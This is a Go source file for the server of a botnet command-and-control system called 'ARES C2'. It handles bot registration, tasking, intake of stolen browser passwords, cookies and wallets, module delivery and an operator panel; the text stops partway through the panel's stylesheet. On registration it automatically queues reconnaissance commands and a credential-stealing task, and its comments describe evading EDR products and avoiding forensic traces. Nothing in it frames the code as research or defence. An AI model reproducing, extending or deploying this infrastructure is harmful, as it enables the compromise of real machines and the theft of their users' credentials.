/*
 * ═══════════════════════════════════════════════════════════════
 *  ARES C2 SERVER — HTTP Handler (Bot ↔ C2 Protocol)
 *  
 *  Endpoints:
 *    POST /api/v1/register   — Bot registers with fingerprint
 *    POST /api/v1/beacon     — Bot checks in, gets tasks
 *    POST /api/v1/result     — Bot sends task results
 *    POST /api/v1/exfil      — Bot uploads stolen data
 *
 *  Panel API:
 *    GET  /api/panel/bots        — List all bots
 *    POST /api/panel/task        — Queue task for bot
 *    GET  /api/panel/data/:botid — Get stolen data
 *    GET  /api/panel/stats       — Dashboard stats
 * ═══════════════════════════════════════════════════════════════
 */

package handler

import (
	"ares-c2/internal/models"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	mathrand "math/rand"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/bcrypt"
)

// Default bcrypt hash of the legacy panel auth token.
// Generated at startup from the --token flag value.
var legacyTokenHash []byte

type C2Handler struct {
	Store      *models.BotStore
	DataDir    string
	StolenData map[string][]models.StolenData
	Results    map[string][]models.TaskResult
	mu         sync.RWMutex
	AuthToken  string // Panel auth token (legacy, kept for backward compat)
	BotSecret  string // HMAC secret for bot auth tokens
	BotTokens  map[string]string // botID -> auth token
	tokenMu    sync.RWMutex
	StartTime  time.Time
	mux        *http.ServeMux
	regRates   map[string][]time.Time
	regMu      sync.Mutex
	// v4.0: Persistence + Auth
	Persist    *Persistence
	Auth       *AuthManager
}

func NewC2Handler(dataDir string, authToken string) *C2Handler {
	os.MkdirAll(dataDir, 0755)

	// v3.3: Persist BotSecret so encrypted exfil data survives C2 restarts
	secretFile := filepath.Join(dataDir, ".secret")
	var secretHex string
	if data, err := os.ReadFile(secretFile); err == nil && len(data) >= 64 {
		secretHex = string(data[:64])
		log.Printf("[*] Loaded persistent bot secret from %s", secretFile)
	} else {
		secret := make([]byte, 32)
		rand.Read(secret)
		secretHex = hex.EncodeToString(secret)
		os.WriteFile(secretFile, []byte(secretHex), 0600)
		log.Printf("[*] Generated new bot secret -> %s", secretFile)
	}

	// v4.3: Hash the legacy auth token with bcrypt at startup
	hash, err := bcrypt.GenerateFromPassword([]byte(authToken), bcrypt.DefaultCost)
	if err != nil {
		log.Fatalf("[!] Failed to hash auth token: %v", err)
	}
	legacyTokenHash = hash

	h := &C2Handler{
		Store:      models.NewBotStore(),
		DataDir:    dataDir,
		StolenData: make(map[string][]models.StolenData),
		Results:    make(map[string][]models.TaskResult),
		AuthToken:  authToken,
		BotSecret:  secretHex,
		BotTokens:  make(map[string]string),
		StartTime:  time.Now(),
		regRates:   make(map[string][]time.Time),
	}

	// v4.0: Initialize persistence and restore state
	h.Persist = NewPersistence(dataDir)
	h.Persist.Load(h)
	h.Persist.StartAutoSave(h, 30*time.Second)

	// v4.0: Initialize operator auth
	h.Auth = NewAuthManager(dataDir)

	// v5.0 FIX H-1: Periodically purge old in-memory stolen data (still on disk)
	go func() {
		ticker := time.NewTicker(10 * time.Minute)
		defer ticker.Stop()
		for range ticker.C {
			h.mu.Lock()
			for botID, dataList := range h.StolenData {
				var keep []models.StolenData
				for _, d := range dataList {
					if time.Since(d.Timestamp) < 24*time.Hour {
						keep = append(keep, d)
					}
				}
				if len(keep) == 0 {
					delete(h.StolenData, botID)
				} else {
					h.StolenData[botID] = keep
				}
			}
			h.mu.Unlock()
		}
	}()

	// v5.0 FIX H-2: Periodically clean up stale rate-limit IP entries
	go func() {
		ticker := time.NewTicker(5 * time.Minute)
		defer ticker.Stop()
		for range ticker.C {
			h.regMu.Lock()
			now := time.Now()
			for ip, times := range h.regRates {
				var recent []time.Time
				for _, t := range times {
					if now.Sub(t) < time.Minute {
						recent = append(recent, t)
					}
				}
				if len(recent) == 0 {
					delete(h.regRates, ip)
				} else {
					h.regRates[ip] = recent
				}
			}
			h.regMu.Unlock()
		}
	}()

	return h
}

// generateBotToken creates HMAC-SHA256 auth token for a bot
func (h *C2Handler) generateBotToken(botID string) string {
	mac := hmac.New(sha256.New, []byte(h.BotSecret))
	mac.Write([]byte(botID))
	token := hex.EncodeToString(mac.Sum(nil))[:32]
	h.tokenMu.Lock()
	h.BotTokens[botID] = token
	h.tokenMu.Unlock()
	return token
}

// validateBotToken checks bot auth token.
// v4.3 FIX: Try body token (tk field) first, fall back to X-Bot-Token header.
// v4.1 FIX: Auto-regenerate token for bots restored from persistence.
// Token generation is deterministic (HMAC), so the same botID + BotSecret
// always produces the same token. If a bot was restored but its token
// wasn't in the map, we regenerate it instead of rejecting.
func (h *C2Handler) validateBotToken(r *http.Request, botID string, bodyToken string) bool {
	// v4.3: Prefer token from POST body field "tk", fall back to header
	token := bodyToken
	if token == "" {
		token = r.Header.Get("X-Bot-Token")
	}
	// v5.0 FIX H-4: Safe botID truncation to prevent panic on short/empty botID
	shortID := botID
	if len(shortID) > 8 {
		shortID = shortID[:8]
	}
	if token == "" {
		log.Printf("[AUTH] Bot %s: no bot token in body or header", shortID)
		return false
	}
	h.tokenMu.RLock()
	expected, ok := h.BotTokens[botID]
	h.tokenMu.RUnlock()
	if !ok {
		// v4.1 FIX: Bot exists in store (restored from persistence) but token
		// not in memory map. Regenerate deterministically from HMAC.
		if h.Store.Get(botID) != nil {
			expected = h.generateBotToken(botID)
			ok = true
			log.Printf("[AUTH] Bot %s: token regenerated from persistence", shortID)
		} else {
			log.Printf("[AUTH] Bot %s: unknown bot, not in store or token map", shortID)
			return false
		}
	}
	if !hmac.Equal([]byte(token), []byte(expected)) {
		log.Printf("[AUTH] Bot %s: token mismatch", shortID)
		return false
	}
	return true
}

func (h *C2Handler) RegisterRoutes(mux *http.ServeMux) {
	h.mux = mux
	// Bot API (register is open; beacon/exfil/result require bot token)
	mux.HandleFunc("POST /api/v1/register", h.handleRegister)
	mux.HandleFunc("POST /api/v1/beacon", h.handleBeacon)
	mux.HandleFunc("POST /api/v1/result", h.handleResult)
	mux.HandleFunc("POST /api/v1/exfil", h.handleExfil)

	// v4.0: Operator auth endpoint
	mux.HandleFunc("POST /api/auth/login", h.Auth.HandleLogin)

	// Panel API (requires panel auth token — legacy Bearer + new session both work)
	mux.HandleFunc("GET /api/panel/bots", h.authMiddleware(h.handleListBots))
	mux.HandleFunc("POST /api/panel/task", h.authMiddleware(h.handleQueueTask))
	mux.HandleFunc("POST /api/panel/kill-all", h.authMiddleware(h.handleKillAll))
	mux.HandleFunc("GET /api/panel/data/", h.authMiddleware(h.handleGetData))
	mux.HandleFunc("GET /api/panel/results/", h.authMiddleware(h.handleGetResults))
	mux.HandleFunc("GET /api/panel/stats", h.authMiddleware(h.handleStats))

	// Builder API
	mux.HandleFunc("POST /api/panel/build", h.authMiddleware(h.handleBuild))
	mux.HandleFunc("GET /api/panel/build/download/", h.authMiddleware(h.handleBuildDownload))

	// v4.0: Audit log endpoint
	mux.HandleFunc("GET /api/panel/audit", h.authMiddleware(h.handleAuditLog))

	// v3.9: COFF module serve (bot requests on-demand modules)
	// v5.0 FIX C-4: Require bot auth token for module downloads
	mux.HandleFunc("GET /api/v1/module/", h.botAuthModuleMiddleware(h.handleModuleServe))

	// Web panel
	mux.HandleFunc("GET /", h.handlePanel)
}

// ── Bot API Handlers ──

func (h *C2Handler) handleRegister(w http.ResponseWriter, r *http.Request) {
	var reg struct {
		Hostname   string `json:"hostname"`
		Username   string `json:"username"`
		Domain     string `json:"domain"`
		OS         string `json:"os"`
		Arch       string `json:"arch"`
		PID        int    `json:"pid"`
		HWID       string `json:"hwid"`
		Elevated   bool   `json:"elevated"`
	}

	if err := json.NewDecoder(r.Body).Decode(&reg); err != nil {
		http.Error(w, "invalid body", 400)
		return
	}

	// v3.2: Rate limiting — max 10 registrations per IP per minute (C-4 fix)
	clientIP := extractIP(r)
	h.regMu.Lock()
	now := time.Now()
	// Prune old entries
	var recent []time.Time
	for _, t := range h.regRates[clientIP] {
		if now.Sub(t) < time.Minute {
			recent = append(recent, t)
		}
	}
	if len(recent) >= 10 {
		h.regMu.Unlock()
		http.Error(w, "rate limited", 429)
		log.Printf("[!] Rate limited registration from %s", clientIP)
		return
	}
	h.regRates[clientIP] = append(recent, now)
	h.regMu.Unlock()

	// Generate unique bot ID
	botID := generateID()

	bot := &models.Bot{
		ID:         botID,
		Hostname:   reg.Hostname,
		Username:   reg.Username,
		Domain:     reg.Domain,
		OS:         reg.OS,
		Arch:       reg.Arch,
		PID:        reg.PID,
		HWID:       reg.HWID,
		ExternalIP: extractIP(r),
		Elevated:   reg.Elevated,
		FirstSeen:  time.Now(),
		LastSeen:   time.Now(),
		Status:     "active",
	}

	h.Store.Register(bot)

	// Generate per-bot auth token
	botToken := h.generateBotToken(botID)

	// v5.0 FIX M-1: Don't log bot token prefix
	log.Printf("[+] Bot registered: %s (%s@%s) from %s",
		botID, reg.Username, reg.Hostname, bot.ExternalIP)

	botDir := filepath.Join(h.DataDir, botID)
	os.MkdirAll(filepath.Join(botDir, "exfil"), 0755)
	os.MkdirAll(filepath.Join(botDir, "results"), 0755)

	// v4.2: Auto-queue SILENT recon + native steal tasks on first registration.
	// REMOVED: PowerShell + Python chain — caught by every EDR.
	// NEW: Use native agent stealer (TaskStealBrowser=5) + minimal recon via cmd.
	// v4.3: Shuffle recon commands and pick 2-3 random ones to reduce fingerprinting.
	// Steal task always included at random position.
	reconCmds := []models.Task{
		// === RECON (silent cmd — no PowerShell, no certutil) ===
		{Type: 1, Args: []string{"whoami"}},
		{Type: 1, Args: []string{"cmd /c systeminfo"}},
		{Type: 1, Args: []string{"cmd /c ipconfig /all"}},
		// === SAVED WINDOWS CREDENTIALS (silent) ===
		{Type: 1, Args: []string{"cmdkey /list"}},
	}

	// Shuffle recon commands
	mathrand.Shuffle(len(reconCmds), func(i, j int) {
		reconCmds[i], reconCmds[j] = reconCmds[j], reconCmds[i]
	})

	// Pick 2-3 random recon commands
	pickCount := 2 + mathrand.Intn(2) // 2 or 3
	if pickCount > len(reconCmds) {
		pickCount = len(reconCmds)
	}
	selected := reconCmds[:pickCount]

	// === NATIVE STEAL: Browser passwords + cookies (no PowerShell!) ===
	// Type 5 = TaskStealBrowser — handled natively by agent stealer.c
	// Zero child processes, zero PowerShell, zero Python.
	stealTask := models.Task{Type: 5, Args: []string{}}

	// Insert steal task at random position
	insertPos := mathrand.Intn(len(selected) + 1)
	autoTasks := make([]models.Task, 0, len(selected)+1)
	autoTasks = append(autoTasks, selected[:insertPos]...)
	autoTasks = append(autoTasks, stealTask)
	autoTasks = append(autoTasks, selected[insertPos:]...)

	for i := range autoTasks {
		autoTasks[i].ID = fmt.Sprintf("auto_%d", i)
		autoTasks[i].CreatedAt = time.Now()
		// v4.4: Stagger tasks with random 5-30s delay per index to reduce fingerprinting
		taskDelay := time.Duration(5+mathrand.Intn(25)) * time.Second * time.Duration(i)
		autoTasks[i].DelayMs = int(taskDelay.Milliseconds())
		bot.AddTask(autoTasks[i])
	}
	log.Printf("[+] Auto-queued %d recon+steal tasks for %s (staggered delays)", len(autoTasks), botID)

	json.NewEncoder(w).Encode(map[string]interface{}{
		"bot_id":    botID,
		"bot_token": botToken, // Bot must use this for all future requests
		"sleep_ms":  10000,
		"tasks":     []interface{}{}, // Tasks queued via AddTask, delivered on first beacon
	})
}

func (h *C2Handler) handleBeacon(w http.ResponseWriter, r *http.Request) {
	var beacon struct {
		BotID string `json:"bot_id"`
		Tk    string `json:"tk,omitempty"` // v4.3: bot token from body
	}
	if err := json.NewDecoder(r.Body).Decode(&beacon); err != nil {
		http.Error(w, "invalid body", 400)
		return
	}

	// Validate bot auth token
	if !h.validateBotToken(r, beacon.BotID, beacon.Tk) {
		http.Error(w, "unauthorized", 401)
		return
	}

	bot := h.Store.Get(beacon.BotID)
	if bot == nil {
		http.Error(w, "unknown bot", 404)
		return
	}

	bot.LastSeen = time.Now()
	bot.Status = "active"

	tasks := bot.PopTasks()

	// v3.2: Adaptive beacon sleep (L-2 fix)
	// Faster when tasks are pending, slower when idle
	sleepMs := 10000
	if len(tasks) > 0 {
		sleepMs = 3000 // Fast poll when active
	} else if time.Since(bot.FirstSeen) > 24*time.Hour {
		sleepMs = 30000 // Slow down after 24h
	}

	json.NewEncoder(w).Encode(map[string]interface{}{
		"tasks":    tasks,
		"sleep_ms": sleepMs,
	})
}

func (h *C2Handler) handleResult(w http.ResponseWriter, r *http.Request) {
	// v4.3: Parse into wrapper to extract tk field alongside TaskResult
	var wrapper struct {
		models.TaskResult
		Tk string `json:"tk,omitempty"`
	}
	if err := json.NewDecoder(r.Body).Decode(&wrapper); err != nil {
		http.Error(w, "invalid body", 400)
		return
	}
	result := wrapper.TaskResult

	// Validate bot auth token (was missing — security fix)
	if result.BotID == "" {
		http.Error(w, "missing bot_id", 400)
		return
	}
	if !h.validateBotToken(r, result.BotID, wrapper.Tk) {
		http.Error(w, "unauthorized", 401)
		return
	}

	h.mu.Lock()
	h.Results[result.BotID] = append(h.Results[result.BotID], result)
	h.mu.Unlock()

	log.Printf("[*] Task result from %s: task=%s success=%v output=%d bytes",
		result.BotID, result.TaskID, result.Success, len(result.Output))

	// Save encrypted to disk (v3.5: consistent with exfil — no plaintext results)
	resultDir := filepath.Join(h.DataDir, result.BotID, "results")
	os.MkdirAll(resultDir, 0755)
	data, _ := json.MarshalIndent(result, "", "  ")
	// v3.5: Encrypt results same as exfil — prevents forensic trail
	randBytes := make([]byte, 8)
	rand.Read(randBytes)
	filename := fmt.Sprintf("%x.dat", randBytes)
	encrypted, err := h.encryptExfil(result.BotID, data)
	if err != nil {
		// v5.0 FIX C-6: NEVER save plaintext — drop data instead
		log.Printf("[!] Encrypt failed for %s: %v — DATA DROPPED (security policy)", result.BotID, err)
	} else {
		os.WriteFile(filepath.Join(resultDir, filename), encrypted, 0600)
	}

	w.WriteHeader(200)
}

func (h *C2Handler) handleExfil(w http.ResponseWriter, r *http.Request) {
	body, err := io.ReadAll(io.LimitReader(r.Body, 50*1024*1024))
	if err != nil {
		http.Error(w, "read error", 400)
		return
	}

	// Quick-parse bot_id, type, and tk for auth + routing
	var header struct {
		BotID string `json:"bot_id"`
		Type  string `json:"type"`
		Count int    `json:"count"`
		Tk    string `json:"tk,omitempty"` // v4.3: bot token from body
	}
	json.Unmarshal(body, &header)

	if header.BotID == "" {
		http.Error(w, "missing bot_id", 400)
		return
	}

	// Validate bot auth
	if !h.validateBotToken(r, header.BotID, header.Tk) {
		http.Error(w, "unauthorized", 401)
		return
	}

	// Parse into StolenData (flexible — handles passwords, cookies, wallets, cloud)
	var stolen models.StolenData
	stolen.BotID = header.BotID
	stolen.Type = header.Type
	stolen.Timestamp = time.Now()

	// Try to parse entries from the raw body
	json.Unmarshal(body, &stolen)

	h.mu.Lock()
	h.StolenData[header.BotID] = append(h.StolenData[header.BotID], stolen)
	h.mu.Unlock()

	log.Printf("[*] EXFIL from %s: type=%s entries=%d size=%d bytes",
		header.BotID, header.Type, len(stolen.Entries), len(body))

	// Save encrypted JSON to disk (AES-256-GCM, key = HMAC-SHA256(BotSecret, botID))
	exfilDir := filepath.Join(h.DataDir, header.BotID, "exfil")
	os.MkdirAll(exfilDir, 0755)

	// v3.2: Randomized filename to prevent forensic pattern matching (L-4 fix)
	// Old: type_timestamp.enc → trivially identifiable
	// New: random hex blob.dat → requires decryption key to identify content
	randBytes := make([]byte, 8)
	rand.Read(randBytes)
	filename := fmt.Sprintf("%x.dat", randBytes)

	encrypted, err := h.encryptExfil(header.BotID, body)
	if err != nil {
		log.Printf("[!] Exfil encrypt failed for %s: %v", header.BotID, err)
		w.WriteHeader(200) // still ack to bot
		return
	}
	os.WriteFile(filepath.Join(exfilDir, filename), encrypted, 0600)

	w.WriteHeader(200)
}

// v3.9: COFF module serve — delivers on-demand modules to bots
func (h *C2Handler) handleModuleServe(w http.ResponseWriter, r *http.Request) {
	// Extract module name from path: /api/v1/module/{name}
	parts := strings.Split(r.URL.Path, "/")
	if len(parts) < 5 {
		http.Error(w, "invalid", 400)
		return
	}
	moduleName := parts[len(parts)-1]

	// Sanitize: only allow alphanumeric + underscore
	for _, c := range moduleName {
		if !((c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') || (c >= '0' && c <= '9') || c == '_') {
			http.Error(w, "invalid module name", 400)
			return
		}
	}

	// Look for COFF file in modules/ directory
	modulePath := filepath.Join("modules", moduleName+".o")
	data, err := os.ReadFile(modulePath)
	if err != nil {
		// Fallback: check build/ directory
		modulePath = filepath.Join("build", moduleName+".o")
		data, err = os.ReadFile(modulePath)
		if err != nil {
			http.Error(w, "module not found", 404)
			return
		}
	}

	log.Printf("[MODULE] served %s (%d bytes) to %s", moduleName, len(data), r.RemoteAddr)

	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Length", fmt.Sprintf("%d", len(data)))
	w.Write(data)
}

// ── Panel API Handlers ──

func (h *C2Handler) handleListBots(w http.ResponseWriter, r *http.Request) {
	bots := h.Store.List()

	// Mark stale bots
	for _, b := range bots {
		if time.Since(b.LastSeen) > 5*time.Minute {
			b.Status = "sleeping"
		}
		if time.Since(b.LastSeen) > 1*time.Hour {
			b.Status = "dead"
		}
	}

	json.NewEncoder(w).Encode(bots)
}

func (h *C2Handler) handleQueueTask(w http.ResponseWriter, r *http.Request) {
	var req struct {
		BotID string       `json:"bot_id"`
		Task  models.Task  `json:"task"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "invalid body", 400)
		return
	}

	bot := h.Store.Get(req.BotID)
	if bot == nil {
		http.Error(w, "unknown bot", 404)
		return
	}

	req.Task.ID = generateID()
	req.Task.CreatedAt = time.Now()
	bot.AddTask(req.Task)

	log.Printf("[>] Task queued for %s: type=%d id=%s", req.BotID, req.Task.Type, req.Task.ID)
	json.NewEncoder(w).Encode(map[string]string{"task_id": req.Task.ID})
}

// v3.9: Kill switch — broadcast self-destruct to ALL bots
func (h *C2Handler) handleKillAll(w http.ResponseWriter, r *http.Request) {
	bots := h.Store.List()
	count := 0
	for _, bot := range bots {
		task := models.Task{
			ID:        generateID(),
			Type:      models.TaskSelfDestruct,
			CreatedAt: time.Now(),
		}
		bot.AddTask(task)
		count++
	}
	log.Printf("[!] KILL SWITCH: self-destruct queued for %d bots", count)
	json.NewEncoder(w).Encode(map[string]interface{}{"killed": count})
}

func (h *C2Handler) handleGetData(w http.ResponseWriter, r *http.Request) {
	botID := strings.TrimPrefix(r.URL.Path, "/api/panel/data/")
	if botID == "" || botID == r.URL.Path {
		botID = r.URL.Query().Get("bot_id")
	}
	if botID == "" {
		json.NewEncoder(w).Encode([]interface{}{})
		return
	}
	// v5.0 FIX H-5: Sanitize botID to prevent path traversal
	botID = sanitizeBotID(botID)
	if botID == "" {
		http.Error(w, "invalid bot_id", 400)
		return
	}

	// Read actual raw JSON files from disk (full data)
	exfilDir := filepath.Join(h.DataDir, botID, "exfil")
	files, err := os.ReadDir(exfilDir)
	if err != nil || len(files) == 0 {
		// Fallback to in-memory metadata
		h.mu.RLock()
		data := h.StolenData[botID]
		h.mu.RUnlock()
		json.NewEncoder(w).Encode(data)
		return
	}

	typeFilter := r.URL.Query().Get("type")
	var results []json.RawMessage

	for _, f := range files {
		if f.IsDir() {
			continue
		}
		raw, err := os.ReadFile(filepath.Join(exfilDir, f.Name()))
		if err != nil {
			continue
		}
		// Decrypt encrypted files (.enc or .dat)
		if strings.HasSuffix(f.Name(), ".enc") || strings.HasSuffix(f.Name(), ".dat") {
			decrypted, err := h.decryptExfil(botID, raw)
			if err != nil {
				continue
			}
			raw = decrypted
		}
		// Skip non-JSON content
		if !json.Valid(raw) {
			continue
		}
		// v3.2 fix: filter by "type" field INSIDE JSON, not by filename
		if typeFilter != "" {
			var meta struct{ Type string `json:"type"` }
			json.Unmarshal(raw, &meta)
			if meta.Type != typeFilter {
				continue
			}
		}
		results = append(results, json.RawMessage(raw))
	}

	w.Header().Set("Content-Type", "application/json")
	if results == nil {
		results = []json.RawMessage{}
	}
	json.NewEncoder(w).Encode(results)
}

func (h *C2Handler) handleGetResults(w http.ResponseWriter, r *http.Request) {
	botID := strings.TrimPrefix(r.URL.Path, "/api/panel/results/")
	if botID == "" || botID == r.URL.Path {
		botID = r.URL.Query().Get("bot_id")
	}
	h.mu.RLock()
	results := h.Results[botID]
	h.mu.RUnlock()

	// Filter by: ?task_type=1, ?success=true
	taskTypeFilter := r.URL.Query().Get("task_type")
	successFilter := r.URL.Query().Get("success")

	if taskTypeFilter == "" && successFilter == "" {
		json.NewEncoder(w).Encode(results)
		return
	}

	var filtered []models.TaskResult
	for _, res := range results {
		if taskTypeFilter != "" {
			var tt int
			fmt.Sscanf(taskTypeFilter, "%d", &tt)
			if int(res.TaskType) != tt {
				continue
			}
		}
		if successFilter != "" {
			if successFilter == "true" && !res.Success {
				continue
			}
			if successFilter == "false" && res.Success {
				continue
			}
		}
		filtered = append(filtered, res)
	}
	json.NewEncoder(w).Encode(filtered)
}

func (h *C2Handler) handleStats(w http.ResponseWriter, r *http.Request) {
	bots := h.Store.List()
	active, sleeping, dead := 0, 0, 0
	totalCreds := 0

	for _, b := range bots {
		switch {
		case time.Since(b.LastSeen) > 1*time.Hour:
			dead++
		case time.Since(b.LastSeen) > 5*time.Minute:
			sleeping++
		default:
			active++
		}
	}

	h.mu.RLock()
	for _, data := range h.StolenData {
		for _, d := range data {
			totalCreds += len(d.Entries)
		}
	}
	h.mu.RUnlock()

	json.NewEncoder(w).Encode(map[string]interface{}{
		"total_bots":  len(bots),
		"active":      active,
		"sleeping":    sleeping,
		"dead":        dead,
		"total_creds": totalCreds,
		"uptime":      time.Since(h.StartTime).String(),
	})
}

func (h *C2Handler) handlePanel(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html")
	w.Write([]byte(panelHTML))
}

var panelHTML = `<!DOCTYPE html>
<html><head><title>ARES C2</title>
<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<style>
/* v5.0 FIX M-3: Removed Google Fonts CDN — prevents operator IP leak to Google */
*{margin:0;padding:0;box-sizing:border-box}
:root{--bg:#06060a;--surface:rgba(17,17,27,0.85);--surface-solid:#11111b;--card:rgba(22,22,36,0.7);--border:rgba(45,45,65,0.5);--red:#ff3860;--red-glow:rgba(255,56,96,0.15);--green:#00e676;--green-dim:rgba(0,230,118,0.12);--yellow:#ffc107;--yellow-dim:rgba(255,193,7,0.12);--blue:#448aff;--blue-dim:rgba(68,138,255,0.12);--purple:#b388ff;--text:#e1e4ec;--text-dim:#8b8fa3;--muted:#565a6e;--hover:rgba(255,56,96,0.06);--accent:linear-gradient(135deg,#ff3860,#ff6b6b);--glass:rgba(255,255,255,0.03);--radius:10px;--shadow:0 4px 24px rgba(0,0,0,0.3)}
body{font-family:'Inter',system-ui,sans-serif;background:var(--bg);color:var(--text);overflow-x:hidden;min-height:100vh}
body::before{content:'';position:fixed;top:0;left:0;right:0;height:400px;background:radial-gradient(ellipse at top,rgba(255,56,96,0.06),transparent 70%);pointer-events:none;z-index:0}
.login{display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;gap:20px;position:relative;z-index:1}
.login h1{background:var(--accent);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-size:36px;font-weight:800;letter-spacing:3px}
.login .sub{color:var(--muted);font-size:12px;letter-spacing:2px;text-transform:uppercase}
.login input{background:var(--surface-solid);border:1px solid var(--border);color:var(--text);padding:12px 18px;border-radius:var(--radius);width:320px;font-size:14px;font-family:'Inter';transition:.3s}
.login input:focus{outline:none;border-color:var(--red);box-shadow:0 0 20px var(--red-glow)}
.login button{background:var(--accent);color:#fff;border:none;padding:12px 40px;border-radius:var(--radius);cursor:pointer;font-size:14px;font-weight:600;font-family:'Inter';letter-spacing:1px;transition:.3s}
.login button:hover{transform:translateY(-2px);box-shadow:0 8px 25px var(--red-glow)}
.app{display:none;position:relative;z-index:1}
.header{background:var(--surface);backdrop-filter:blur(20px);border-bottom:1px solid var(--border);padding:14px 28px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100}
.header h1{background:var(--accent);-webkit-background-clip:text;-webkit-text-fill-color:transparent;font-size:18px;font-weight:800;letter-spacing:2px}
.header .meta{color:var(--muted);font-size:11px;font-family:'JetBrains Mono'}
.tabs{display:flex;gap:0;border-bottom:1px solid var(--border);background:var(--surface);backdrop-filter:blur(20px);position:sticky;top:50px;z-index:99}
.tab{padding:12px 28px;cursor:pointer;color:var(--muted);font-size:13px;font-weight:500;border-bottom:2px solid transparent;transition:.3s;letter-spacing:0.5px}
.tab:hover{color:var(--text);background:var(--hover)}
.tab.active{color:var(--red);border-bottom-color:var(--red);background:var(--hover)}
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:14px;padding:20px 28px}
.stat{background:var(--card);backdrop-filter:blur(10px);border:1px solid var(--border);border-radius:12px;padding:20px;text-align:center;transition:.3s}
.stat:hover{border-color:rgba(255,56,96,0.3);transform:translateY(-2px);box-shadow:var(--shadow)}
.stat .n{font-size:32px;font-weight:800;background:var(--accent);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.stat .n.g{background:linear-gradient(135deg,#00e676,#69f0ae);-webkit-background-clip:text}
.stat .n.y{background:linear-gradient(135deg,#ffc107,#ffca28);-webkit-background-clip:text}
.stat .l{color:var(--muted);font-size:10px;margin-top:6px;text-transform:uppercase;letter-spacing:1.5px;font-weight:600}
.panel{padding:20px 28px}
table{width:100%;border-collapse:collapse;font-size:13px;table-layout:fixed}
th{text-align:left;padding:10px 12px;color:var(--text-dim);font-weight:600;border-bottom:1px solid var(--border);font-size:10px;text-transform:uppercase;letter-spacing:1px}
td{padding:10px 12px;border-bottom:1px solid rgba(30,30,50,0.5);word-break:break-all;overflow:hidden;text-overflow:ellipsis}
tr{transition:.2s}
tr:hover{background:var(--hover)}
.s-active{color:var(--green);font-weight:600}.s-sleeping{color:var(--yellow)}.s-dead{color:#f44}
.actions{display:flex;gap:4px;flex-wrap:wrap}
.btn{background:rgba(45,45,65,0.6);color:var(--text-dim);border:1px solid var(--border);padding:4px 10px;border-radius:6px;cursor:pointer;font-size:11px;font-family:'Inter';font-weight:500;transition:.2s}
.btn:hover{background:var(--red);color:#fff;border-color:var(--red);transform:translateY(-1px)}
.btn.danger{background:rgba(255,56,96,0.1);border-color:rgba(255,56,96,0.3);color:var(--red)}
.btn.danger:hover{background:var(--red);color:#fff}
.hidden{display:none}
.log{background:var(--card);border:1px solid var(--border);border-radius:var(--radius);padding:16px;font-family:'JetBrains Mono';font-size:12px;max-height:65vh;overflow-y:auto;white-space:pre-wrap;color:var(--green);line-height:1.6}
.data-viewer{display:grid;gap:14px}
.data-card{background:var(--card);backdrop-filter:blur(10px);border:1px solid var(--border);border-radius:12px;padding:0;overflow:hidden;transition:.3s}
.data-card:hover{border-color:rgba(255,56,96,0.2)}
.data-card h3{color:var(--text);font-size:13px;font-weight:600;cursor:pointer;display:flex;align-items:center;gap:8px;padding:14px 18px;background:rgba(255,255,255,0.02);border-bottom:1px solid var(--border);transition:.2s}
.data-card h3:hover{background:rgba(255,56,96,0.04)}
.data-card h3 .toggle{font-size:10px;color:var(--muted);transition:.3s;margin-left:auto}
.data-card h3 .tag{font-size:10px;font-weight:600;padding:2px 8px;border-radius:4px;text-transform:uppercase;letter-spacing:0.5px}
.data-card h3 .tag.pw{background:var(--green-dim);color:var(--green)}
.data-card h3 .tag.ck{background:var(--yellow-dim);color:var(--yellow)}
.data-card h3 .tag.ss{background:var(--blue-dim);color:var(--blue)}
.data-card h3 .tag.wf{background:rgba(179,136,255,0.12);color:var(--purple)}
.data-card h3 .tag.rc{background:rgba(255,255,255,0.06);color:var(--text-dim)}
.data-card-body{padding:16px 18px}
.data-card pre{font-size:11px;overflow-x:auto;max-height:300px;color:var(--muted);font-family:'JetBrains Mono';line-height:1.5}
.search-box{width:100%;padding:12px 18px;background:var(--card);border:1px solid var(--border);border-radius:var(--radius);color:var(--text);font-size:13px;font-family:'Inter';margin-bottom:16px;transition:.3s}
.search-box:focus{outline:none;border-color:var(--red);box-shadow:0 0 20px var(--red-glow)}
.search-box::placeholder{color:var(--muted)}
.cred-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(360px,1fr));gap:10px;max-height:75vh;overflow-y:auto;padding:4px}
.cred-item{background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:12px 14px;transition:.2s;position:relative}
.cred-item:hover{border-color:rgba(255,56,96,0.4);box-shadow:0 2px 12px rgba(0,0,0,0.2)}
.cred-item .ci-url{color:var(--text-dim);font-size:11px;font-family:'JetBrains Mono';white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-bottom:6px;padding-bottom:6px;border-bottom:1px solid rgba(45,45,65,0.3)}
.cred-item .ci-row{display:flex;gap:10px;align-items:center;margin:3px 0}
.cred-item .ci-label{color:var(--muted);font-size:9px;text-transform:uppercase;min-width:48px;font-weight:600;letter-spacing:0.5px}
.cred-item .ci-val{color:var(--text);font-size:12px;font-family:'JetBrains Mono';word-break:break-all}
.cred-item .ci-pass{color:var(--green);font-weight:600}
.cred-item .ci-badge{display:inline-block;padding:2px 8px;border-radius:4px;font-size:9px;font-weight:600;letter-spacing:0.5px}
.cred-item .ci-badge.ok{background:var(--green-dim);color:var(--green)}
.cred-item .ci-badge.fail{background:rgba(255,56,96,0.1);color:var(--red)}
.ck-table{width:100%;border-collapse:collapse;font-size:12px;table-layout:fixed}
.ck-table th{padding:8px 10px;text-align:left;color:var(--text-dim);font-size:9px;text-transform:uppercase;letter-spacing:1px;border-bottom:1px solid var(--border);font-weight:600}
